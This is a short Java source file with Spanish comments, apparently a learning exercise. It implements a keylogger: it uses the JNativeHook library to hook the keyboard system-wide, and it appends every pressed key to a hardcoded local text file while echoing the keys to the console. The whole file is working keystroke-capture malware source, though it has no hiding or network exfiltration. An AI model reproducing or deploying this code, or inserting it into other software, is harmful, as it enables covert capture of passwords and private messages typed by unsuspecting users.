package Test;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger implements NativeKeyListener {

	public static void main(String[] args) {

		// Se inicia la rutina de inicializacion de los componentes de la
		// libreria JNativeHook
		try {
			GlobalScreen.registerNativeHook();
		} catch (Exception e) {
			e.printStackTrace();
		}

		/*
		 * Es necesario decirle a la instancia de GlobalScreen que se agregará
		 * un Listener, ya que la clase Main implementa la interfaz del Listener
		 * sólo se crea una instancia de dicha clase para colocarla como
		 * argumento:
		 */
		GlobalScreen.getInstance().addNativeKeyListener(new KeyLogger());
	}

	// El método que se utilizará por ahora es nativeKeyPressed:
	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		// El código que imprimirá en la salida estándar cuál tecla se ha
		// presionado es:
		//System.out.println(NativeKeyEvent.getKeyText(e.getKeyCode()));
		String texto = NativeKeyEvent.getKeyText(e.getKeyCode());
		String espacio = " ";
		if(e.getKeyChar() == NativeKeyEvent.VK_SPACE){
			    texto = texto + espacio ;
		}    
		      
		try {        
			escribirArchivo(texto);
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		System.out.print(texto);
	}
      
	@Override      
	public void nativeKeyReleased(NativeKeyEvent e) {
		// TODO Auto-generated method stub

	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {
		// TODO Auto-generated method stub

	}
	
	//Creamos el archivo para poder guardar las teclas que presionamos
	public void escribirArchivo(String text) throws IOException{
		File archivo = new File("E:/James/archivos/archivo15.txt");
		BufferedWriter bw = null;
		
		try {
			bw = new BufferedWriter(new FileWriter(archivo, true));
			bw.write(text);
		} catch (Exception e) {
			e.printStackTrace();
		}        
		bw.close();
		  
		
	}

}
